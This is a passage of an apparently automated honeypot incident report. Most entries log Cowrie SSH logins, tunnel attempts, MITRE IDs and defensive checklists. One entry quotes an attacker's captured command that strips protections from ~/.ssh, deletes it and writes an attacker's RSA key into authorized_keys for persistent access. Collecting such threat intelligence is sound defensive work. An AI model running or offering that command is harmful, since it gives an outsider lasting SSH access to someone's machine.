- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6f7260aa1e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:47 |
| **Last Seen** | 2026-09-03 03:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:47:55` | `cowrie.session.connect` |
| `2026-09-03 03:47:55` | `cowrie.client.version` |
| `2026-09-03 03:47:55` | `cowrie.client.kex` |
| `2026-09-03 03:47:57` | `cowrie.login.success` |
| `2026-09-03 03:47:58` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:47:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:47:58` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f4b94908a2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:55 |
| **Last Seen** | 2026-09-03 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:55:10` | `cowrie.session.connect` |
| `2026-09-03 03:55:10` | `cowrie.client.version` |
| `2026-09-03 03:55:10` | `cowrie.client.kex` |
| `2026-09-03 03:55:11` | `cowrie.login.success` |
| `2026-09-03 03:55:11` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:55:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:55:11` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90803f0aa919

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:58 |
| **Last Seen** | 2026-09-03 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:58:57` | `cowrie.session.connect` |
| `2026-09-03 03:58:57` | `cowrie.client.version` |
| `2026-09-03 03:58:57` | `cowrie.client.kex` |
| `2026-09-03 03:58:58` | `cowrie.login.success` |
| `2026-09-03 03:58:58` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:58:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:58:58` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a9f760be5b

| Field | Detail |
|---|---|
| **Source IP** | `36.95.221[.]140` |
| **First Seen** | 2026-09-03 04:00 |
| **Last Seen** | 2026-09-03 04:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:00:18` | `cowrie.session.connect` |
| `2026-09-03 04:00:18` | `cowrie.client.version` |
| `2026-09-03 04:00:18` | `cowrie.client.kex` |
| `2026-09-03 04:00:19` | `cowrie.login.success` |
| `2026-09-03 04:00:20` | `cowrie.session.params` |
| `2026-09-03 04:00:20` | `cowrie.command.input` |
| `2026-09-03 04:00:20` | `cowrie.command.failed` |
| `2026-09-03 04:00:20` | `cowrie.log.closed` |
| `2026-09-03 04:00:21` | `cowrie.session.params` |
| `2026-09-03 04:00:21` | `cowrie.command.input` |
| `2026-09-03 04:00:22` | `cowrie.session.file_download` |
| `2026-09-03 04:00:22` | `cowrie.log.closed` |
| `2026-09-03 04:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.221[.]140` to AbuseIPDB if not already reported
- [ ] Block `36.95.221[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6be1d0e5ca88

| Field | Detail |
|---|---|
| **Source IP** | `36.95.221[.]140` |
| **First Seen** | 2026-09-03 04:00 |
| **Last Seen** | 2026-09-03 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:00:22` | `cowrie.session.connect` |
| `2026-09-03 04:00:22` | `cowrie.client.version` |
| `2026-09-03 04:00:22` | `cowrie.client.kex` |
| `2026-09-03 04:00:23` | `cowrie.login.success` |
| `2026-09-03 04:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.221[.]140` to AbuseIPDB if not already reported
- [ ] Block `36.95.221[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d201a9299882

| Field | Detail |
|---|---|
| **Source IP** | `36.95.221[.]140` |
| **First Seen** | 2026-09-03 04:00 |
| **Last Seen** | 2026-09-03 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:00:24` | `cowrie.session.connect` |
| `2026-09-03 04:00:24` | `cowrie.client.version` |
| `2026-09-03 04:00:24` | `cowrie.client.kex` |
| `2026-09-03 04:00:25` | `cowrie.login.success` |
| `2026-09-03 04:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.221[.]140` to AbuseIPDB if not already reported
- [ ] Block `36.95.221[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38f775d0d05e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:04 |
| **Last Seen** | 2026-09-03 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:04:49` | `cowrie.session.connect` |
| `2026-09-03 04:04:49` | `cowrie.client.version` |
| `2026-09-03 04:04:49` | `cowrie.client.kex` |
| `2026-09-03 04:04:50` | `cowrie.login.success` |
| `2026-09-03 04:04:50` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:04:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:04:51` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22134bc7cba5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:09 |
| **Last Seen** | 2026-09-03 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:09:47` | `cowrie.session.connect` |
| `2026-09-03 04:09:47` | `cowrie.client.version` |
| `2026-09-03 04:09:48` | `cowrie.client.kex` |
| `2026-09-03 04:09:48` | `cowrie.login.success` |
| `2026-09-03 04:09:49` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:09:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:09:49` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3719c97d4643

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 04:10 |
| **Last Seen** | 2026-09-03 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:10:14` | `cowrie.session.connect` |
| `2026-09-03 04:10:14` | `cowrie.client.version` |
| `2026-09-03 04:10:14` | `cowrie.client.kex` |
| `2026-09-03 04:10:14` | `cowrie.login.success` |
| `2026-09-03 04:10:14` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:10:15` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c8d20f197b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:14 |
| **Last Seen** | 2026-09-03 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:14:25` | `cowrie.session.connect` |
| `2026-09-03 04:14:25` | `cowrie.client.version` |
| `2026-09-03 04:14:25` | `cowrie.client.kex` |
| `2026-09-03 04:14:26` | `cowrie.login.success` |
| `2026-09-03 04:14:26` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:14:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:14:27` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc98bb563ba0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:20 |
| **Last Seen** | 2026-09-03 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:20:24` | `cowrie.session.connect` |
| `2026-09-03 04:20:24` | `cowrie.client.version` |
| `2026-09-03 04:20:24` | `cowrie.client.kex` |
| `2026-09-03 04:20:25` | `cowrie.login.success` |
| `2026-09-03 04:20:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:20:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:20:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bc5775fb570

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:23 |
| **Last Seen** | 2026-09-03 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:23:54` | `cowrie.session.connect` |
| `2026-09-03 04:23:54` | `cowrie.client.version` |
| `2026-09-03 04:23:55` | `cowrie.client.kex` |
| `2026-09-03 04:23:56` | `cowrie.login.success` |
| `2026-09-03 04:23:56` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:23:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:23:56` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c81752bf9ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:31 |
| **Last Seen** | 2026-09-03 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:31:16` | `cowrie.session.connect` |
| `2026-09-03 04:31:16` | `cowrie.client.version` |
| `2026-09-03 04:31:16` | `cowrie.client.kex` |
| `2026-09-03 04:31:17` | `cowrie.login.success` |
| `2026-09-03 04:31:17` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:31:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:31:17` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4059a14546

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:33 |
| **Last Seen** | 2026-09-03 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:33:24` | `cowrie.session.connect` |
| `2026-09-03 04:33:24` | `cowrie.client.version` |
| `2026-09-03 04:33:25` | `cowrie.client.kex` |
| `2026-09-03 04:33:25` | `cowrie.login.success` |
| `2026-09-03 04:33:26` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:33:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:33:26` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf5bba5c81f4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:42 |
| **Last Seen** | 2026-09-03 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:42:07` | `cowrie.session.connect` |
| `2026-09-03 04:42:07` | `cowrie.client.version` |
| `2026-09-03 04:42:07` | `cowrie.client.kex` |
| `2026-09-03 04:42:08` | `cowrie.login.success` |
| `2026-09-03 04:42:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:42:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:42:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b53fc2965a4b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:43 |
| **Last Seen** | 2026-09-03 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:43:07` | `cowrie.session.connect` |
| `2026-09-03 04:43:07` | `cowrie.client.version` |
| `2026-09-03 04:43:07` | `cowrie.client.kex` |
| `2026-09-03 04:43:08` | `cowrie.login.success` |
| `2026-09-03 04:43:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:43:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:43:09` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda71aa8cf76

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:52 |
| **Last Seen** | 2026-09-03 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:52:22` | `cowrie.session.connect` |
| `2026-09-03 04:52:22` | `cowrie.client.version` |
| `2026-09-03 04:52:22` | `cowrie.client.kex` |
| `2026-09-03 04:52:23` | `cowrie.login.success` |
| `2026-09-03 04:52:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:52:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:52:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104e3907dc80

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 04:52 |
| **Last Seen** | 2026-09-03 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 04:52:37` | `cowrie.session.connect` |
| `2026-09-03 04:52:37` | `cowrie.client.version` |
| `2026-09-03 04:52:37` | `cowrie.client.kex` |
| `2026-09-03 04:52:38` | `cowrie.login.success` |
| `2026-09-03 04:52:38` | `cowrie.direct-tcpip.request` |
| `2026-09-03 04:52:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 04:52:38` | `cowrie.direct-tcpip.data` |
| `2026-09-03 04:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-807ba09f31e6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:01 |
| **Last Seen** | 2026-09-03 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:01:59` | `cowrie.session.connect` |
| `2026-09-03 05:01:59` | `cowrie.client.version` |
| `2026-09-03 05:01:59` | `cowrie.client.kex` |
| `2026-09-03 05:02:00` | `cowrie.login.success` |
| `2026-09-03 05:02:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:02:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:02:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9620daa66ebb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:03 |
| **Last Seen** | 2026-09-03 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:03:26` | `cowrie.session.connect` |
| `2026-09-03 05:03:26` | `cowrie.client.version` |
| `2026-09-03 05:03:26` | `cowrie.client.kex` |
| `2026-09-03 05:03:27` | `cowrie.login.success` |
| `2026-09-03 05:03:27` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:03:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:03:27` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d27e6a6448

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:11 |
| **Last Seen** | 2026-09-03 05:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:11:29` | `cowrie.session.connect` |
| `2026-09-03 05:11:29` | `cowrie.client.version` |
| `2026-09-03 05:11:29` | `cowrie.client.kex` |
| `2026-09-03 05:11:30` | `cowrie.login.success` |
| `2026-09-03 05:11:30` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:11:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:11:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b34ef73afb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:14 |
| **Last Seen** | 2026-09-03 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 05:14:01` | `cowrie.session.connect` |
| `2026-09-03 05:14:01` | `cowrie.client.version` |
| `2026-09-03 05:14:01` | `cowrie.client.kex` |
| `2026-09-03 05:14:02` | `cowrie.login.success` |
| `2026-09-03 05:14:02` | `cowrie.direct-tcpip.request` |
| `2026-09-03 05:14:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 05:14:03` | `cowrie.direct-tcpip.data` |
| `2026-09-03 05:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1acd0f521e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 05:21 |
| **Last Seen** | 2026-09-03 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
